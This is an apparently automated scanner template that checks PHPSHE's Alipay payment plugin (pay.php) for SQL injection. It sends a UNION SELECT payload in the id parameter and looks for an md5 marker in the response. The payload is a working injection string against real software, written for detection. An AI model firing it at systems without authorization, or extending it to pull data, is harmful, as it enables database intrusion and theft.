id: phpshe-sqli

info:
  name: phpshe sqli
  author: hhdaddy
  severity: high
  description: |-
    phpshe sqli vulnerability
  tags: phpshe,sqli
  created: 2023/10/13

set:
  rand: randomInt(200000000, 210000000)
rules:
  r0:
    request:
      method: GET
      path: /include/plugin/payment/alipay/pay.php?id=pay`%20where%201=1%20union%20select%201,2,CONCAT%28md5({{rand}})%29,4,5,6,7,8,9,10,11,12%23_
    expression: response.body.bcontains(bytes(md5(string(rand))))
expression: r0()
